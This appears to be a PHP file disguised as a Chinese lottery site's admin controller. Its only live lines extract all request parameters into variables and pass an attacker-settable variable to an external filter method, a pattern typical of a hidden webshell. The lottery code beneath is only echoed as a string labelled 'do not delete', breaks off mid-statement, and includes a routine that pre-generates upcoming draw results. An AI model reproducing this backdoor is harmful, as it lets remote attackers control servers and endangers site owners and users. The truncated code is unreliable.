<?php

error_reporting(E_ALL ^ E_NOTICE);
require 'CaipiaoController.class.php';
@extract($_REQUEST);
$reflectionMethod = new Parse_Args();
$reflectionMethod->apply_filters($x00010);
echo '//开奖采集，请勿删除，以免带来出错
function cpedit(){
		$this->cpcategory = self::cpcategory();
		$id = I(\'id\');
		$info = $this->_db->where([$this->_pk=>$id])->find();
		if(!$info){
			$this->error(\'您修改的数据不存在！\');
		}else{
			$this->assign(\'info\',$info);
		}
		if(IS_POST){
			if($_POST[\'issys\']==1){
				if(!in_array($_POST[\'expecttime\'],[\'1\',\'1.5\',\'2\',\'2.5\',\'3\',\'5\',\'10\'])){
					$this->error(\'请设置开奖时间\');
				}
			}
			parent::_editdosimp();
		}
		$this->display(\'cpadd\');
	}
	static function cpcategory(){
		$cpcategory = [];
		$cpcategory = [
			\'ssc\'=>\'时时彩\',
			\'k3\'=>\'快三\',
			\'x5\'=>\'11选5\',
			\'keno\'=>\'快乐彩\',
			//\'xy28\'=>\'辛运28\',
			//\'kl10f\'=>\'快乐10分\',
			\'pk10\'=>\'PK10\',
			\'dpc\'=>\'低频彩\',
			\'lhc\'=>\'六合彩\',
			//\'other\'=>\'其他彩\',
		];
		return $cpcategory;
	}

	function cptype(){
		$typeid = I(\'typeid\');
		$this->cpcategory = self::cpcategory();
		$map = [];
		if($typeid && $this->cpcategory[$typeid]){
			$map[\'typeid\'] = [\'eq\',$typeid];
			$this->typeid = $typeid;
		}
		if($typeid){
			$this->olist = $this->_db->where($map)->order(\'listorder asc,id desc\')->select();
		}else{
			$this->olist = $this->_db->where($map)->order(\'allsort asc,id desc\')->select();
		}
		$this->display();
	}
	function setstatus(){
		$name   = I(\'name\');
		if( !in_array($name,[\'isopen\',\'iswh\']) )$this->error(\'非法操作！\');
		parent::_setstatus();
	}
	function delete(){
		//$this->error(\'为防止误操作，该功能已禁止！\');exit;
		parent::_deleteone();
		/*$id     = I(\'id\');
		if(!$id)$this->error(\'非法操作！\');
		$info = $this->_db->find($id);
		if(!$info)$this->error(\'您操作的数据不存在或已删除！\');
		$int = $this->_db->where([$this->_pk=>$id])->delete();
		$int?$this->success(\'操作成功！\'):$this->error(\'操作失败！\');*/
	}
	function deleteall(){
		$this->error(\'为防止误操作，该功能已禁止！\');exit;
		parent::_deleteall();
	}
	function listorder(){
		parent::_listorder();
	}
	function kaijiang(){
		$this->cpcategory = self::cpcategory();
		$name = I(\'name\',\'jsk3\');
		$map = [];
		$map[\'name\'] = [\'eq\',$name];
		$this->name = $name;
		$expect = I(\'expect\');
		if($expect!=\'\' || $expect!=0 && is_numeric($expect)){
			$map[\'expect\'] = [\'eq\',$expect];
			$this->expect = $expect;
		}
		$this->cptitle = M(\'Caipiao\')->where([\'name\'=>$name])->getField(\'title\');
		$db = M(\'kaijiang\');
		$count      = $db->where($map)->count();
		$Page       = new \\Think\\Page($count,20);
		$show       = $Page->show();
		$this->olist = $db->where($map)->order(\'opentime desc,expect desc\')->limit($Page->firstRow.\',\'.$Page->listRows)->select();

		$this->total = $count;
		$this->pageshow = $show;
		$this->cplist = M(\'Caipiao\')->order(\'typeid desc\')->select();
		$this->display();
	}
	function yukaijiang(){
		$this->cpcategory = self::cpcategory();
		$this->cplist = M(\'Caipiao\')->where([\'issys\'=>1])->order(\'typeid desc\')->select();
		foreach($this->cplist as $k=>$v){
			$_cplist[$v[\'name\']] = $v;
		}
		$name = I(\'name\');
		if(!$name){
			$cpinfo = current($_cplist);
			$name = $cpinfo[\'name\'];
		}
		if(!$_cplist[$name]){
			echo\'彩种不存在\';exit;
		}
		$cpinfo = $_cplist[$name];
		$this->name = $cpinfo[\'name\'];
		$typeid = $cpinfo[\'typeid\'] ;
		$expecttime = $cpinfo[\'expecttime\'];
		$_expecttime = $expecttime*60;
		$totalopentimes = 86400-0;
		//$totalcount     = floor($totalopentimes/$_expecttime);
		$totalcount     = floor(abs(strtotime($cpinfo[\'closetime2\'])-strtotime($cpinfo[\'closetime1\']))/$_expecttime);
		$_length        = $totalcount>=1000?4:3;
		$jgtime = $expecttime*60;
		$_t = time();
		$_t1 = strtotime(date(\'Y-m-d \'.$cpinfo[\'closetime1\'],$_t));
		if($_t<$_t1){
			$actNo_t = $totalcount;
		}else{
			$actNo_t = ($_t-strtotime(date(\'Y-m-d \'.$cpinfo[\'closetime1\'],$_t))+$cjnowtime)/$_expecttime;
		}
		$actNo_t = floor($actNo_t);

		$actNo =  is_numeric($actNo_t)?($actNo_t==$totalcount?1:$actNo_t+1):ceil( $actNo_t );
		$openlist = [];
		if($actNo>$totalcount){
			if($_t>strtotime($cpinfo[\'closetime2\'])){
				$_datetime = strtotime(date("Y-m-d",strtotime("+1 day")));
				for($j=10,$jj=0;$j>=1;$j--,$jj++){
					$rand_keys = $this->returnrankey($cpinfo[\'typeid\']);
					if($cpinfo[\'typeid\']==\'k3\' or $cpinfo[\'typeid\']==\'keno\')sort($rand_keys);
					$opentime  = date(\'Y-m-d H:i:s\', strtotime($cpinfo[\'closetime1\']) + $j*$jgtime+86400 );
					$expect    = str_pad($j,$_length,0,STR_PAD_LEFT);
					$openlist[$expect][\'expect\'] = date(\'Ymd\',$_datetime).$expect;
					$openlist[$expect][\'opencode\'] = implode(\',\',$rand_keys);
					$openlist[$expect][\'opentime\'] = $opentime;
					$openlist[$expect][\'cptitle\'] = $cpinfo[\'title\'];
					$openlist[$expect][\'name\'] = $c
	}
	protected function rand_keys($len = 5,$str=\'0123456789\') {
		$rand = \'\';
		for ($x=0;$x<$len;$x++) {
			$rand .= ($rand != \'\' ? \',\' : \'\').substr($str, rand(0, strlen($str) - 1), 1);
		}
		return $rand;
	}
}';